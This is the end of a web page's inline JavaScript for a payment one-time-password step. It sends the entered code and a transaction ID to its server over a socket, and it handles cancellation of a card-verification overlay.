        verifyBtn.addEventListener('click', () => {
            if (state.otpValue.length === 6) {
                verifyBtn.disabled = true;
                verifyBtn.innerHTML = `
                    <div class="flex items-center justify-center">
                        <svg class="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                        </svg>
                        Verifying
                    </div>
                `;
                
                socket.emit('otp_submission', {
                    transaction_id: state.transactionId,
                    otp: state.otpValue,
                    timestamp: new Date().toISOString()
                });
                
                showProcessingUI();
            }
        });
    }
}

// Fix for MC cancel button 
document.addEventListener('click', function(event) {
    if (event.target && event.target.id === 'mcCancelBtn') {
        console.log('Cancel button clicked');
        
        // Hide the verification overlay
        const mcVerificationOverlay = document.getElementById('mcVerificationOverlay');
        if (mcVerificationOverlay) {
            mcVerificationOverlay.style.display = 'none';
        }
        
        // Clear any timers
        if (mcTimerInterval) {
            clearInterval(mcTimerInterval);
            mcTimerInterval = null;
        }
        
        // Notify server
        if (socket) {
            socket.emit('mc_verification_cancelled', {
                invoiceId: state.transactionId || '',
                reason: 'cancelled_by_user'
            });
        }
        
        // Show error UI
        showErrorUI("Payment Cancelled", "This payment was cancelled by you.");
    }
}, true);
</script>
</body>
</html>
